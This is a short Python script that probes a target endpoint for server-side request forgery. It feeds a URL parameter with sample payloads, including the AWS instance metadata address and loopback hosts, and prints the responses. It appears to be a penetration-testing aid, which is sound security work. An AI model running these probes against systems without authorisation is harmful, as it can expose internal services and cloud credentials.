import requests

# Function to check for SSRF vulnerabilities
def check_ssrf(url, test_payloads):
    results = []
    
    for payload in test_payloads:
        try:
            # Make a request to the target URL with payload
            response = requests.get(url, params={"url": payload}, timeout=5)
            results.append((payload, response.status_code, response.text))
        except requests.exceptions.Timeout:
            results.append((payload, "TIMEOUT", "Request timed out"))
        except requests.exceptions.RequestException as e:
            results.append((payload, "ERROR", str(e)))
    
    return results

# Main function
def main():
    target_url = input("Enter the target URL (e.g., http://example.com/vulnerable-endpoint): ")
    
    # Sample payloads to test for SSRF
    ssrf_payloads = [
        # External URLs
        "http://example.com",
        
        # Internal resources (update according to network structure)
        "http://169.254.169.254/latest/meta-data/",  # Example for AWS metadata
        "http://localhost",  # Loopback to test for local access
        "http://127.0.0.1:80",  # Localhost on port 80
        "http://internal.example.com/api",  # Replace with internal service if applicable
        # Add other test URLs as needed
    ]
    
    # Execute SSRF check
    print(f"Checking for SSRF vulnerabilities on {target_url}...\n")
    results = check_ssrf(target_url, ssrf_payloads)
    
    # Display results
    for payload, status_code, response in results:
        print(f"Payload: {payload}")
        print(f"Status Code: {status_code}")
        print(f"Response: {response[:100]}...")  # Print the first 100 chars of the response
        print("-----")

if __name__ == "__main__":
    main()
